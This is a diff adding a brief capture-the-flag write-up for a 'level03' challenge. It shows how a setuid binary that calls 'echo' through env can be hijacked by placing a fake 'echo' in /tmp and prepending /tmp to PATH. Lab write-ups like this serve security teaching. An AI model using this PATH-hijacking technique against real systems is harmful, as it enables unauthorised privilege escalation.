@@ -1,0 +1,14 @@
+##LEVEL 03
+
+Here we have an executable file named level03. We can see that the file is executed with the flag03 user's rights. So we can assume we may use the getflag command with it.
+
+By doing `strings level03`, we can see that the echo system call is called: `/usr/bin/env echo Exploit me`, and it invites us to exploit it.
+
+We may now assume that its possible to redirect the call with the PATH environnement variable to do a getflag.
+
+We can create a file only inside /tmp : `echo "/bin/getflag" > /tmp/echo`
+Give the rights to the file: chmod +x /tmp/echo
+
+export PATH=/tmp:$PATH
+
+Now, each time the PATH will be called, it will also call everything inside the /tmp folder. So by executing `./level03`, it now prints the flag.
